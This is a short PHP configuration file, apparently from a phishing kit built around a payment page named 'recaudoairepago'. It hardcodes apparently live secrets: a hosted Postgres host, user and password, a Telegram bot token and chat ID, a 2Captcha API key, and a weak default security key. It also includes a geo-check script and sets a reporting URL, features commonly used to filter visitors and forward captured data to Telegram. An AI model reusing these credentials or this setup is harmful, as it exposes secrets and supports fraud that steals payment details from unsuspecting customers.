<?php
require_once __DIR__ . '/geo_check.php';

// Parse DATABASE_URL if present (Render default)
$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'aire';
$db_port = '5432';

if (getenv('DATABASE_URL')) {
    $url = parse_url(getenv('DATABASE_URL'));
    $db_host = $url['host'] ?? 'ep-weathered-rain-ayjuf6bo-pooler.c-5.us-east-2.aws.neon.tech';
    $db_user = $url['user'] ?? 'neondb_owner';
    $db_pass = $url['pass'] ?? 'npg_KQde7j2JLoSF';
    $db_name = isset($url['path']) ? ltrim($url['path'], '/') : 'neondb';
    $db_port = $url['port'] ?? 5432;
} else {
    // Fallback to individual env vars or local defaults
    $db_host = getenv('DB_HOST') ?: 'ep-weathered-rain-ayjuf6bo-pooler.c-5.us-east-2.aws.neon.tech';
    $db_user = getenv('DB_USER') ?: 'neondb_owner';
    $db_pass = getenv('DB_PASS') ?: 'npg_KQde7j2JLoSF';
    $db_name = getenv('DB_NAME') ?: 'neondb';
    $db_port = getenv('DB_PORT') ?: '5432';
}

return [
    'botToken' => getenv('BOT_TOKEN') ?: '8635283514:AAFh6dwBMtmuvK5FgLgj4eyW6PV1Gciktqk',
    'chatId' => getenv('CHAT_ID') ?: '-1004376731124',
    'db_host' => $db_host,
    'db_user' => $db_user,
    'db_pass' => $db_pass,
    'db_name' => $db_name,
    'db_port' => $db_port,
    'db_sslmode' => 'require',
    'baseUrl' => getenv('BASE_URL') ?: 'https://recaudoairepago.vercel.app/updatetele.php',
    'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123',
    'twocaptcha_api_key' => '12f9e3865d60235df14c8dff5e8854b9'
];
?>